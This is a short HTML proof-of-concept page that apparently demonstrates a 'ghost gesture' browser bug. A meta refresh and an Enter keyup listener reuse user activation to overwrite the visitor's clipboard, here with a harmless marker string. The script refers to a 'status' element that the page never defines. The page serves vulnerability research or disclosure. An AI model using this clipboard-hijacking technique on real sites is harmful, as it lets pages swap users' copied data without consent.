<!DOCTYPE html>
<html>

<head>
    <title>PoC - Site B (Clipboard)</title>

    <!-- meta refresh: redirect / reload after 2 seconds -->
    <meta http-equiv="refresh" content="2">

    <style>
        body {
            font-family: monospace;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: white;
        }

        #timer {
            font-size: 3rem;
            font-weight: bold;
        }

        #status {
            margin-top: 20px;
            color: #666;
            font-weight: bold;
        }
    </style>
</head>

<body>
    <div id="timer">2s...</div>
    <script>
        setTimeout(() => {
            document.getElementById('timer').innerText = "1s...";
        }, 1000);

        setTimeout(() => {
            document.getElementById('timer').innerText = "LEPAS!";
        }, 2000);

        window.addEventListener('keyup', async (e) => {
            if (e.key === 'Enter') {
                const status = document.getElementById('status');

                if (navigator.userActivation.isActive) {
                    try {
                        await navigator.clipboard.writeText("POC - UTAA");
                        status.innerText = "RESULT: SUCCESS (Clipboard Hijacked!)";
                        status.style.color = "green";
                        console.log("Ghost Gesture Success: Clipboard modified.");
                    } catch (err) {
                        status.innerText = "RESULT: FAILED (Blocked by Permission Policy)";
                        status.style.color = "red";
                        console.error(err);
                    }
                } else {
                    status.innerText = "RESULT: EXPIRED (User Activation was reset)";
                    status.style.color = "blue";
                }
            }
        });
    </script>
</body>

</html>
